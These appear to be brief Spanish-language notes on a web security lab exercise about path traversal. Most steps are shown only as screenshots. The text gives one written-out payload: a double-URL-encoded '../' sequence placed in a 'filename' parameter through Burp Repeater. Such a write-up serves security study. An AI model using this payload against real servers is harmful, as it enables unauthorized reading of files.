
## Objetivo:

![[Pasted image 20240525142733.png]]

## Solucion:

![[Pasted image 20240525142813.png]]


![[Pasted image 20240525142858.png]]


Vemos la peticion en Burp y la enviamos al Repeater

![[Pasted image 20240525142924.png]]


Crear un **../../../../../../../** doble url encodeado y al final quedaria asi %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66

Y lo ponemos en el parametro **filename** de la peticion
![[Pasted image 20240525143603.png]]

![[Pasted image 20240525144009.png]]

